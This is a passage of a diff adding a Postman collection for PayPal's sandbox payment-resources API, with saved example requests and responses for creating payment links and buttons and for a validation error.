+              "value": "cache-sjc10040-SJC, cache-sjc10040-SJC, cache-phx1710038-PHX"
+            },
+            {
+              "key": "X-Cache",
+              "value": "MISS, MISS, MISS"
+            },
+            {
+              "key": "X-Cache-Hits",
+              "value": "0, 0, 0"
+            },
+            {
+              "key": "X-Timer",
+              "value": "S1781734703.681718,VS0,VE293"
+            },
+            {
+              "key": "Vary",
+              "value": "Accept-Encoding"
+            }
+          ],
+          "cookie": [],
+          "body": "{\n    \"id\": \"PLB-NLGYJQ3LMBXE\",\n    \"integration_mode\": \"LINK\",\n    \"type\": \"BUY_NOW\",\n    \"reusable\": \"MULTIPLE\",\n    \"return_url\": \"https://merchant.example.com/thank-you\",\n    \"line_items\": [\n        {\n            \"name\": \"Custom Leather Jacket\",\n            \"description\": \"Premium handcrafted full-grain leather jacket. Available in multiple sizes and colors.\",\n            \"taxes\": [\n                {\n                    \"type\": \"PERCENTAGE\",\n                    \"value\": \"8.25\"\n                }\n            ],\n            \"shipping\": [\n                {\n                    \"type\": \"FLAT\",\n                    \"value\": \"12.00\"\n                }\n            ],\n            \"discounts\": [\n                {\n                    \"type\": \"PERCENTAGE\",\n                    \"value\": \"10\"\n                }\n            ],\n            \"handling\": [\n                {\n                    \"type\": \"FLAT\",\n                    \"value\": \"5.00\"\n                }\n            ],\n            \"collect_shipping_address\": true,\n            \"customer_notes\": [\n                {\n                    \"required\": true,\n                    \"label\": \"Engraving text (max 20 characters)\"\n                },\n                {\n                    \"required\": false,\n                    \"label\": \"Gift message (optional)\"\n                }\n            ],\n            \"variants\": {\n                \"dimensions\": [\n                    {\n                        \"name\": \"Size\",\n                        \"primary\": true,\n                        \"options\": [\n                            {\n                                \"label\": \"Small\",\n                                \"unit_amount\": {\n                                    \"currency_code\": \"USD\",\n                                    \"value\": \"229.99\"\n                                }\n                            },\n                            {\n                                \"label\": \"Medium\",\n                                \"unit_amount\": {\n                                    \"currency_code\": \"USD\",\n                                    \"value\": \"249.99\"\n                                }\n                            },\n                            {\n                                \"label\": \"Large\",\n                                \"unit_amount\": {\n                                    \"currency_code\": \"USD\",\n                                    \"value\": \"269.99\"\n                                }\n                            }\n                        ]\n                    },\n                    {\n                        \"name\": \"Color\",\n                        \"primary\": false,\n                        \"options\": [\n                            {\n                                \"label\": \"Black\"\n                            },\n                            {\n                                \"label\": \"Brown\"\n                            },\n                            {\n                                \"label\": \"Tan\"\n                            }\n                        ]\n                    }\n                ]\n            },\n            \"adjustable_quantity\": {\n                \"maximum\": 5\n            }\n        }\n    ],\n    \"status\": \"ACTIVE\",\n    \"create_time\": \"2026-06-17T22:18:22Z\",\n    \"update_time\": \"2026-06-17T22:18:22Z\",\n    \"links\": [\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-NLGYJQ3LMBXE\",\n            \"rel\": \"self\",\n            \"method\": \"GET\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-NLGYJQ3LMBXE\",\n            \"rel\": \"replace\",\n            \"method\": \"PUT\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-NLGYJQ3LMBXE\",\n            \"rel\": \"edit\",\n            \"method\": \"PATCH\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-NLGYJQ3LMBXE\",\n            \"rel\": \"delete\",\n            \"method\": \"DELETE\"\n        },\n        {\n            \"href\": \"https://www.sandbox.paypal.com/ncp/payment/PLB-NLGYJQ3LMBXE\",\n            \"rel\": \"payment_link\",\n            \"method\": \"GET\"\n        }\n    ]\n}"
+        },
+        {
+          "name": "201 - Create payment link with taxes, shipping, discounts, handling, customer notes, and dimensions of variants",
+          "originalRequest": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "PayPal-Request-Id",
+                "value": "{{$guid}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"type\": \"BUY_NOW\",\n    \"integration_mode\": \"LINK\",\n    \"reusable\": \"MULTIPLE\",\n    \"return_url\": \"https://merchant.example.com/thank-you\",\n    \"line_items\": [\n        {\n            \"name\": \"Custom Leather Jacket\",\n            \"description\": \"Premium handcrafted full-grain leather jacket. Available in multiple sizes and colors.\",\n            \"unit_amount\": {\n                \"currency_code\": \"USD\",\n                \"value\": \"249.99\"\n            },\n            \"collect_shipping_address\": true,\n            \"taxes\": [\n                {\n                    \"type\": \"PERCENTAGE\",\n                    \"value\": \"8.25\"\n                }\n            ],\n            \"shipping\": [\n                {\n                    \"type\": \"FLAT\",\n                    \"value\": \"12.00\"\n                }\n            ],\n            \"discounts\": [\n                {\n                    \"type\": \"PERCENTAGE\",\n                    \"value\": \"10\"\n                }\n            ],\n            \"handling\": [\n                {\n                    \"value\": \"5.00\"\n                }\n            ],\n            \"customer_notes\": [\n                {\n                    \"label\": \"Engraving text (max 20 characters)\",\n                    \"required\": true\n                },\n                {\n                    \"label\": \"Gift message (optional)\"\n                }\n            ],\n            \"variants\": {\n                \"dimensions\": [\n                    {\n                        \"name\": \"Size\",\n                        \"primary\": true,\n                        \"options\": [\n                            {\n                                \"label\": \"Small\"\n                            },\n                            {\n                                \"label\": \"Medium\"\n                            },\n                            {\n                                \"label\": \"Large\"\n                            }\n                        ]\n                    },\n                    {\n                        \"name\": \"Color\",\n                        \"primary\": false,\n                        \"options\": [\n                            {\n                                \"label\": \"Black\"\n                            },\n                            {\n                                \"label\": \"Brown\"\n                            },\n                            {\n                                \"label\": \"Tan\"\n                            }\n                        ]\n                    }\n                ]\n            },\n            \"adjustable_quantity\": {\n                \"maximum\": 5\n            }\n        }\n    ]\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/v1/checkout/payment-resources",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "v1",
+                "checkout",
+                "payment-resources"
+              ]
+            }
+          },
+          "status": "Created",
+          "code": 201,
+          "_postman_previewlanguage": null,
+          "header": [
+            {
+              "key": "Connection",
+              "value": "keep-alive"
+            },
+            {
+              "key": "Content-Length",
+              "value": "1648"
+            },
+            {
+              "key": "http_x_pp_az_locator",
+              "value": "ccg18.slc"
+            },
+            {
+              "key": "content-type",
+              "value": "application/json"
+            },
+            {
+              "key": "access-control-expose-headers",
+              "value": "Server-Timing"
+            },
+            {
+              "key": "server",
+              "value": "nginx"
+            },
+            {
+              "key": "cache-control",
+              "value": "max-age=0, no-cache, no-store, must-revalidate"
+            },
+            {
+              "key": "paypal-debug-id",
+              "value": "f16810325852b"
+            },
+            {
+              "key": "strict-transport-security",
+              "value": "max-age=31536000; includeSubDomains"
+            },
+            {
+              "key": "server-timing",
+              "value": "traceparent;desc=\"00-0000000000000000000f16810325852b-7f72edffaee486bb-01\""
+            },
+            {
+              "key": "x-backend-info",
+              "value": "v=1;name=2k1u3gOGb2cebCyZJujTUN--F_ccg18_wju_origin_api_m_2_sandbox_paypal_com;ip=34.106.111.220;port=443;ssl=1;max=200;mr=0;ka_ns=0;ml_ns=0;tka_s=300;tki_s=10;tkp=3;host=api-m.sandbox.paypal.com;min_tls=;max_tls=;sni=edge.sandbox.paypal.com;cert_host=edge.sandbox.paypal.com;ciphers=;check_cert=1;no_reneg=1;to_ns=1000000000;fbto_ns=59000000000;bbto_ns=10000000000;fto_ns=0"
+            },
+            {
+              "key": "Accept-Ranges",
+              "value": "bytes"
+            },
+            {
+              "key": "Via",
+              "value": "1.1 varnish, 1.1 varnish"
+            },
+            {
+              "key": "Edge-Control",
+              "value": "max-age=0"
+            },
+            {
+              "key": "Date",
+              "value": "Wed, 17 Jun 2026 22:20:08 GMT"
+            },
+            {
+              "key": "X-Served-By",
+              "value": "cache-sjc10022-SJC, cache-sjc10022-SJC, cache-phx1710067-PHX"
+            },
+            {
+              "key": "X-Cache",
+              "value": "MISS, MISS, MISS"
+            },
+            {
+              "key": "X-Cache-Hits",
+              "value": "0, 0, 0"
+            },
+            {
+              "key": "X-Timer",
+              "value": "S1781734808.002906,VS0,VE857"
+            },
+            {
+              "key": "Vary",
+              "value": "Accept-Encoding"
+            }
+          ],
+          "cookie": [],
+          "body": "{\n    \"id\": \"PLB-B9YGCYDTNJXK\",\n    \"integration_mode\": \"LINK\",\n    \"type\": \"BUY_NOW\",\n    \"reusable\": \"MULTIPLE\",\n    \"return_url\": \"https://merchant.example.com/thank-you\",\n    \"line_items\": [\n        {\n            \"name\": \"Custom Leather Jacket\",\n            \"description\": \"Premium handcrafted full-grain leather jacket. Available in multiple sizes and colors.\",\n            \"unit_amount\": {\n                \"currency_code\": \"USD\",\n                \"value\": \"249.99\"\n            },\n            \"taxes\": [\n                {\n                    \"type\": \"PERCENTAGE\",\n                    \"value\": \"8.25\"\n                }\n            ],\n            \"shipping\": [\n                {\n                    \"type\": \"FLAT\",\n                    \"value\": \"12.00\"\n                }\n            ],\n            \"discounts\": [\n                {\n                    \"type\": \"PERCENTAGE\",\n                    \"value\": \"10\"\n                }\n            ],\n            \"handling\": [\n                {\n                    \"type\": \"FLAT\",\n                    \"value\": \"5.00\"\n                }\n            ],\n            \"collect_shipping_address\": true,\n            \"customer_notes\": [\n                {\n                    \"required\": true,\n                    \"label\": \"Engraving text (max 20 characters)\"\n                },\n                {\n                    \"required\": false,\n                    \"label\": \"Gift message (optional)\"\n                }\n            ],\n            \"variants\": {\n                \"dimensions\": [\n                    {\n                        \"name\": \"Size\",\n                        \"primary\": true,\n                        \"options\": [\n                            {\n                                \"label\": \"Small\"\n                            },\n                            {\n                                \"label\": \"Medium\"\n                            },\n                            {\n                                \"label\": \"Large\"\n                            }\n                        ]\n                    },\n                    {\n                        \"name\": \"Color\",\n                        \"primary\": false,\n                        \"options\": [\n                            {\n                                \"label\": \"Black\"\n                            },\n                            {\n                                \"label\": \"Brown\"\n                            },\n                            {\n                                \"label\": \"Tan\"\n                            }\n                        ]\n                    }\n                ]\n            },\n            \"adjustable_quantity\": {\n                \"maximum\": 5\n            }\n        }\n    ],\n    \"status\": \"ACTIVE\",\n    \"create_time\": \"2026-06-17T22:20:08Z\",\n    \"update_time\": \"2026-06-17T22:20:08Z\",\n    \"links\": [\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-B9YGCYDTNJXK\",\n            \"rel\": \"self\",\n            \"method\": \"GET\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-B9YGCYDTNJXK\",\n            \"rel\": \"replace\",\n            \"method\": \"PUT\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-B9YGCYDTNJXK\",\n            \"rel\": \"edit\",\n            \"method\": \"PATCH\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-B9YGCYDTNJXK\",\n            \"rel\": \"delete\",\n            \"method\": \"DELETE\"\n        },\n        {\n            \"href\": \"https://www.sandbox.paypal.com/ncp/payment/PLB-B9YGCYDTNJXK\",\n            \"rel\": \"payment_link\",\n            \"method\": \"GET\"\n        }\n    ]\n}"
+        },
+        {
+          "name": "201 - Create payment link with free shipping, flat discount, taxes, and handling",
+          "originalRequest": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "PayPal-Request-Id",
+                "value": "{{$guid}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"type\": \"BUY_NOW\",\n    \"integration_mode\": \"LINK\",\n    \"reusable\": \"MULTIPLE\",\n    \"return_url\": \"https://shop.example.com/order-confirmed\",\n    \"line_items\": [\n        {\n            \"name\": \"Yoga Mat - Premium\",\n            \"description\": \"Non-slip eco-friendly yoga mat, 6mm thick.\",\n            \"unit_amount\": {\n                \"currency_code\": \"USD\",\n                \"value\": \"59.99\"\n            },\n            \"collect_shipping_address\": true,\n            \"discounts\": [\n                {\n                    \"type\": \"FLAT\",\n                    \"value\": \"10.00\"\n                }\n            ],\n            \"shipping\": [\n                {\n                    \"type\": \"PREFERENCE\",\n                    \"value\": \"FREE_SHIPPING\"\n                }\n            ],\n            \"taxes\": [\n                {\n                    \"type\": \"PERCENTAGE\",\n                    \"value\": \"7.5\"\n                }\n            ],\n            \"handling\": [\n                {\n                    \"type\": \"FLAT\",\n                    \"value\": \"3.50\"\n                }\n            ]\n        }\n    ]\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/v1/checkout/payment-resources",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "v1",
+                "checkout",
+                "payment-resources"
+              ]
+            }
+          },
+          "status": "Created",
+          "code": 201,
+          "_postman_previewlanguage": null,
+          "header": [
+            {
+              "key": "Connection",
+              "value": "keep-alive"
+            },
+            {
+              "key": "Content-Length",
+              "value": "1218"
+            },
+            {
+              "key": "server",
+              "value": "nginx"
+            },
+            {
+              "key": "access-control-expose-headers",
+              "value": "Server-Timing"
+            },
+            {
+              "key": "strict-transport-security",
+              "value": "max-age=31536000; includeSubDomains"
+            },
+            {
+              "key": "paypal-debug-id",
+              "value": "f4138725b603b"
+            },
+            {
+              "key": "content-type",
+              "value": "application/json"
+            },
+            {
+              "key": "http_x_pp_az_locator",
+              "value": "ccg18.slc"
+            },
+            {
+              "key": "server-timing",
+              "value": "traceparent;desc=\"00-0000000000000000000f4138725b603b-b67f2617a0183a90-01\""
+            },
+            {
+              "key": "cache-control",
+              "value": "max-age=0, no-cache, no-store, must-revalidate"
+            },
+            {
+              "key": "x-backend-info",
+              "value": "v=1;name=2k1u3gOGb2cebCyZJujTUN--F_ccg18_wju_origin_api_m_1_sandbox_paypal_com;ip=34.106.238.133;port=443;ssl=1;max=200;mr=0;ka_ns=0;ml_ns=0;tka_s=300;tki_s=10;tkp=3;host=api-m.sandbox.paypal.com;min_tls=;max_tls=;sni=edge.sandbox.paypal.com;cert_host=edge.sandbox.paypal.com;ciphers=;check_cert=1;no_reneg=1;to_ns=1000000000;fbto_ns=59000000000;bbto_ns=10000000000;fto_ns=0"
+            },
+            {
+              "key": "Accept-Ranges",
+              "value": "bytes"
+            },
+            {
+              "key": "Via",
+              "value": "1.1 varnish, 1.1 varnish"
+            },
+            {
+              "key": "Edge-Control",
+              "value": "max-age=0"
+            },
+            {
+              "key": "Date",
+              "value": "Wed, 17 Jun 2026 22:20:40 GMT"
+            },
+            {
+              "key": "X-Served-By",
+              "value": "cache-sjc10082-SJC, cache-sjc10082-SJC, cache-phx1710067-PHX"
+            },
+            {
+              "key": "X-Cache",
+              "value": "MISS, MISS, MISS"
+            },
+            {
+              "key": "X-Cache-Hits",
+              "value": "0, 0, 0"
+            },
+            {
+              "key": "X-Timer",
+              "value": "S1781734840.000103,VS0,VE403"
+            },
+            {
+              "key": "Vary",
+              "value": "Accept-Encoding"
+            }
+          ],
+          "cookie": [],
+          "body": "{\n    \"id\": \"PLB-JYFRFEZQ86P4\",\n    \"integration_mode\": \"LINK\",\n    \"type\": \"BUY_NOW\",\n    \"reusable\": \"MULTIPLE\",\n    \"return_url\": \"https://shop.example.com/order-confirmed\",\n    \"line_items\": [\n        {\n            \"name\": \"Yoga Mat - Premium\",\n            \"description\": \"Non-slip eco-friendly yoga mat, 6mm thick.\",\n            \"unit_amount\": {\n                \"currency_code\": \"USD\",\n                \"value\": \"59.99\"\n            },\n            \"taxes\": [\n                {\n                    \"type\": \"PERCENTAGE\",\n                    \"value\": \"7.5\"\n                }\n            ],\n            \"shipping\": [\n                {\n                    \"type\": \"PREFERENCE\",\n                    \"value\": \"FREE_SHIPPING\"\n                }\n            ],\n            \"discounts\": [\n                {\n                    \"type\": \"FLAT\",\n                    \"value\": \"10.00\"\n                }\n            ],\n            \"handling\": [\n                {\n                    \"type\": \"FLAT\",\n                    \"value\": \"3.50\"\n                }\n            ],\n            \"collect_shipping_address\": true\n        }\n    ],\n    \"status\": \"ACTIVE\",\n    \"create_time\": \"2026-06-17T22:20:40Z\",\n    \"update_time\": \"2026-06-17T22:20:40Z\",\n    \"links\": [\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-JYFRFEZQ86P4\",\n            \"rel\": \"self\",\n            \"method\": \"GET\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-JYFRFEZQ86P4\",\n            \"rel\": \"replace\",\n            \"method\": \"PUT\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-JYFRFEZQ86P4\",\n            \"rel\": \"edit\",\n            \"method\": \"PATCH\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-JYFRFEZQ86P4\",\n            \"rel\": \"delete\",\n            \"method\": \"DELETE\"\n        },\n        {\n            \"href\": \"https://www.sandbox.paypal.com/ncp/payment/PLB-JYFRFEZQ86P4\",\n            \"rel\": \"payment_link\",\n            \"method\": \"GET\"\n        }\n    ]\n}"
+        },
+        {
+          "name": "201 - Create payment button with shipping and taxes",
+          "originalRequest": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "PayPal-Request-Id",
+                "value": "{{$guid}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"type\": \"BUY_NOW\",\n    \"integration_mode\": \"BUTTON\",\n    \"reusable\": \"MULTIPLE\",\n    \"line_items\": [\n        {\n            \"name\": \"Digital Photography Course\",\n            \"description\": \"12-week online photography masterclass with lifetime access.\",\n            \"unit_amount\": {\n                \"currency_code\": \"USD\",\n                \"value\": \"99.00\"\n            },\n            \"collect_shipping_address\": true,\n            \"taxes\": [\n                {\n                    \"type\": \"PREFERENCE\",\n                    \"value\": \"PROFILE\"\n                }\n            ],\n            \"adjustable_quantity\": {\n                \"maximum\": 10\n            }\n        }\n    ]\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/v1/checkout/payment-resources",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "v1",
+                "checkout",
+                "payment-resources"
+              ]
+            }
+          },
+          "status": "Created",
+          "code": 201,
+          "_postman_previewlanguage": null,
+          "header": [
+            {
+              "key": "Connection",
+              "value": "keep-alive"
+            },
+            {
+              "key": "Content-Length",
+              "value": "1991"
+            },
+            {
+              "key": "server-timing",
+              "value": "traceparent;desc=\"00-0000000000000000000f536395081f19-78fea80d299f54e9-01\""
+            },
+            {
+              "key": "server",
+              "value": "nginx"
+            },
+            {
+              "key": "http_x_pp_az_locator",
+              "value": "ccg18.slc"
+            },
+            {
+              "key": "paypal-debug-id",
+              "value": "f536395081f19"
+            },
+            {
+              "key": "strict-transport-security",
+              "value": "max-age=31536000; includeSubDomains"
+            },
+            {
+              "key": "cache-control",
+              "value": "max-age=0, no-cache, no-store, must-revalidate"
+            },
+            {
+              "key": "access-control-expose-headers",
+              "value": "Server-Timing"
+            },
+            {
+              "key": "content-type",
+              "value": "application/json"
+            },
+            {
+              "key": "x-backend-info",
+              "value": "v=1;name=2k1u3gOGb2cebCyZJujTUN--F_ccg18_wju_origin_api_m_1_sandbox_paypal_com;ip=34.106.238.133;port=443;ssl=1;max=200;mr=0;ka_ns=0;ml_ns=0;tka_s=300;tki_s=10;tkp=3;host=api-m.sandbox.paypal.com;min_tls=;max_tls=;sni=edge.sandbox.paypal.com;cert_host=edge.sandbox.paypal.com;ciphers=;check_cert=1;no_reneg=1;to_ns=1000000000;fbto_ns=59000000000;bbto_ns=10000000000;fto_ns=0"
+            },
+            {
+              "key": "Accept-Ranges",
+              "value": "bytes"
+            },
+            {
+              "key": "Via",
+              "value": "1.1 varnish, 1.1 varnish"
+            },
+            {
+              "key": "Edge-Control",
+              "value": "max-age=0"
+            },
+            {
+              "key": "Date",
+              "value": "Wed, 17 Jun 2026 22:21:44 GMT"
+            },
+            {
+              "key": "X-Served-By",
+              "value": "cache-sjc1000129-SJC, cache-sjc1000129-SJC, cache-phx1710067-PHX"
+            },
+            {
+              "key": "X-Cache",
+              "value": "MISS, MISS, MISS"
+            },
+            {
+              "key": "X-Cache-Hits",
+              "value": "0, 0, 0"
+            },
+            {
+              "key": "X-Timer",
+              "value": "S1781734892.896771,VS0,VE12522"
+            },
+            {
+              "key": "Vary",
+              "value": "Accept-Encoding"
+            }
+          ],
+          "cookie": [],
+          "body": "{\n    \"id\": \"PLB-UXDMCXM4U8Z8\",\n    \"integration_mode\": \"BUTTON\",\n    \"type\": \"BUY_NOW\",\n    \"reusable\": \"MULTIPLE\",\n    \"line_items\": [\n        {\n            \"name\": \"Digital Photography Course\",\n            \"description\": \"12-week online photography masterclass with lifetime access.\",\n            \"unit_amount\": {\n                \"currency_code\": \"USD\",\n                \"value\": \"99.00\"\n            },\n            \"taxes\": [\n                {\n                    \"type\": \"PREFERENCE\",\n                    \"value\": \"PROFILE\"\n                }\n            ],\n            \"collect_shipping_address\": true,\n            \"adjustable_quantity\": {\n                \"maximum\": 10\n            }\n        }\n    ],\n    \"status\": \"ACTIVE\",\n    \"create_time\": \"2026-06-17T22:21:32Z\",\n    \"update_time\": \"2026-06-17T22:21:32Z\",\n    \"links\": [\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-UXDMCXM4U8Z8\",\n            \"rel\": \"self\",\n            \"method\": \"GET\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-UXDMCXM4U8Z8\",\n            \"rel\": \"replace\",\n            \"method\": \"PUT\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-UXDMCXM4U8Z8\",\n            \"rel\": \"edit\",\n            \"method\": \"PATCH\"\n        },\n        {\n            \"href\": \"https://api.sandbox.paypal.com/v1/checkout/payment-resources/PLB-UXDMCXM4U8Z8\",\n            \"rel\": \"delete\",\n            \"method\": \"DELETE\"\n        }\n    ],\n    \"code_snippets\": {\n        \"stacked\": [\n            {\n                \"framework\": \"HTML\",\n                \"head\": \"<script src=\\\"https://www.sandbox.paypal.com/sdk/js?client-id=BAAw7d28Sgu0vg9OO_hMMVbBpWSaMqeFl1CTJegNGwJtCpja0Jw0u_PBWTi-XdWQg9mUGJTvS6VTmWwKw4&components=hosted-buttons&enable-funding=venmo&currency=USD\\\"></script>\",\n                \"button_placement\": \"<div id=\\\"paypal-container-PLB-UXDMCXM4U8Z8\\\"></div><script>paypal.HostedButtons({hostedButtonId: \\\"PLB-UXDMCXM4U8Z8\\\",}).render(\\\"#paypal-container-PLB-UXDMCXM4U8Z8\\\")</script>\"\n            },\n            {\n                \"framework\": \"REACT\",\n                \"head\": \"<script src=\\\"https://www.sandbox.paypal.com/sdk/js?client-id=BAAw7d28Sgu0vg9OO_hMMVbBpWSaMqeFl1CTJegNGwJtCpja0Jw0u_PBWTi-XdWQg9mUGJTvS6VTmWwKw4&components=hosted-buttons&enable-funding=venmo&currency=USD\\\" crossorigin=\\\"anonymous\\\" async></script>\",\n                \"button_placement\": \"<div id=\\\"paypal-container-PLB-UXDMCXM4U8Z8\\\"></div><script>document.addEventListener(\\\"DOMContentLoaded\\\", (event) => {paypal.HostedButtons({hostedButtonId: \\\"PLB-UXDMCXM4U8Z8\\\"}).render(\\\"#paypal-container-PLB-UXDMCXM4U8Z8\\\")})</script>\"\n            }\n        ]\n    }\n}"
+        },
+        {
+          "name": "400 Bad request - Missing Required Parameter",
+          "originalRequest": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "PayPal-Request-Id",
+                "value": "{{$guid}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"integration_mode\": \"LINK\",\n    \"reusable\": \"MULTIPLE\",\n    \"return_url\": \"https://merchant.example.com/thank-you\",\n    \"line_items\": [\n        {\n            \"name\": \"Wireless Mouse\",\n            \"unit_amount\": {\n                \"currency_code\": \"USD\",\n                \"value\": \"39.99\"\n            }\n        }\n    ]\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/v1/checkout/payment-resources",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "v1",
+                "checkout",
+                "payment-resources"
+              ]
+            }
+          },
+          "status": "Bad Request",
+          "code": 400,
+          "_postman_previewlanguage": "json",
+          "header": [
+            {
+              "key": "Connection",
+              "value": "keep-alive"
+            },
+            {
+              "key": "Content-Length",
+              "value": "302"
+            },
+            {
+              "key": "Content-Type",
+              "value": "application/json"
+            },
+            {
+              "key": "Server",
+              "value": "nginx"
+            },
+            {
+              "key": "Access-Control-Expose-Headers",
+              "value": "Server-Timing"
+            },
+            {
+              "key": "Cache-Control",
+              "value": "max-age=0, no-cache, no-store, must-revalidate"
+            },
+            {
+              "key": "Paypal-Debug-Id",
+              "value": "f339245f99bcd"
+            },
+            {
+              "key": "Server-Timing",
+              "value": "traceparent;desc=\"00-0000000000000000000f339245f99bcd-88a9122f458b175b-01\""
+            },
+            {
+              "key": "Validation-Exception",
+              "value": "true"
+            },
+            {
+              "key": "HTTP_X_PP_AZ_LOCATOR",
+              "value": "ccg18.slc"
+            },
+            {
+              "key": "Strict-Transport-Security",
+              "value": "max-age=31536000; includeSubDomains"
+            },
+            {
+              "key": "Accept-Ranges",
+              "value": "bytes"
+            },
+            {
+              "key": "Via",
+              "value": "1.1 varnish, 1.1 varnish"
+            },
+            {
+              "key": "Edge-Control",
+              "value": "max-age=0"
+            },
+            {
+              "key": "Date",
+              "value": "Thu, 15 Jan 2026 19:38:16 GMT"
+            },
+            {
+              "key": "X-Served-By",
+              "value": "cache-sjc10064-SJC, cache-phx1710060-PHX"
+            },
+            {
+              "key": "X-Cache",
+              "value": "MISS, MISS"
+            },
+            {
+              "key": "X-Cache-Hits",
+              "value": "0, 0"
+            },
+            {
+              "key": "X-Timer",
+              "value": "S1768505896.417201,VS0,VE157"
+            },
+            {
+              "key": "Vary",
+              "value": "Accept-Encoding"
+            }
+          ],
+          "cookie": [],
+          "body": "{\n    \"name\": \"INVALID_REQUEST\",\n    \"message\": \"Request is not well-formed, syntactically incorrect, or violates schema.\",\n    \"debug_id\": \"f339245f99bcd\",\n    \"details\": [\n        {\n            \"field\": \"/type\",\n            \"value\": \"\",\n            \"location\": \"body\",\n            \"issue\": \"MISSING_REQUIRED_PARAMETER\",\n            \"description\": \"a required field / parameter is missing.\"\n        }\n    ],\n    \"links\": []\n}"
+        }
+      ]
+    },
+    {
+      "name": "List payment resources",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "url": {
+          "raw": "{{base_url}}/v1/checkout/payment-resources",
+          "host": [
+            "{{base_url}}"
+          ],
+          "path": [
+            "v1",
+            "checkout",
+            "payment-resources"
+          ],
+          "query": [
+            {
+              "key": "page_size",
+              "value": "10",
+              "disabled": true
+            },
+            {
+              "key": "page_token",
+              "value": "",
+              "disabled": true
+            },
+            {
+              "key": "total_required",
+              "value": "false",
+              "disabled": true
+            }
+          ]
+        }
+      },
+      "response": [
+        {
+          "name": "200 - List payment resources",
+          "originalRequest": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/v1/checkout/payment-resources",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "v1",
+                "checkout",
+                "payment-resources"
+              ],
+              "query": [
+                {
+                  "key": "page_size",
+                  "value": "10",
+                  "disabled": true
+                },
+                {
+                  "key": "page_token",
+                  "value": null,
+                  "disabled": true
+                },
+                {
+                  "key": "total_required",
+                  "value": "false",
+                  "disabled": true
+                }
+              ]
+            }
+          },
+          "status": "OK",
+          "code": 200,
+          "_postman_previewlanguage": "json",
+          "header": [
+            {
+              "key": "Connection",
+              "value": "keep-alive"
+            },
+            {
+              "key": "Content-Type",
+              "value": "application/json"
+            },
+            {
+              "key": "Server",
+              "value": "nginx"
+            },
+            {
+              "key": "Access-Control-Expose-Headers",
+              "value": "Server-Timing"
+            },
+            {
+              "key": "Cache-Control",
+              "value": "max-age=0, no-cache, no-store, must-revalidate"
+            },
+            {
+              "key": "Paypal-Debug-Id",
+              "value": "f457254a5938a"
+            },
+            {
+              "key": "Server-Timing",
+              "value": "traceparent;desc=\"00-0000000000000000000f457254a5938a-f1930afe8947941c-01\""
+            },
+            {
+              "key": "HTTP_X_PP_AZ_LOCATOR",
+              "value": "ccg18.slc"
+            },
+            {
+              "key": "Strict-Transport-Security",
+              "value": "max-age=31536000; includeSubDomains"
+            },
+            {
+              "key": "Accept-Ranges",
+              "value": "none"
+            },
+            {
+              "key": "Via",
+              "value": "1.1 varnish, 1.1 varnish"
+            },
+            {
+              "key": "content-encoding",
+              "value": "br"
+            },
+            {
+              "key": "Edge-Control",
+              "value": "max-age=0"
+            },
+            {
+              "key": "Date",
+              "value": "Thu, 15 Jan 2026 19:39:44 GMT"
+            },
+            {
+              "key": "X-Served-By",
+              "value": "cache-sjc10062-SJC, cache-phx1710091-PHX"
+            },
+            {
+              "key": "X-Cache",
+              "value": "MISS, MISS"
+            },
+            {
+              "key": "X-Cache-Hits",
+              "value": "0, 0"
+            },
+            {
+              "key": "X-Timer",
+              "value": "S1768505984.652790,VS0,VE538"
+            },
+            {
+              "key": "Vary",
+              "value": "Accept-Encoding"
+            },
+            {
+              "key": "transfer-encoding",
+              "value": "chunked"
+            }
+          ],
+          "cookie": [],
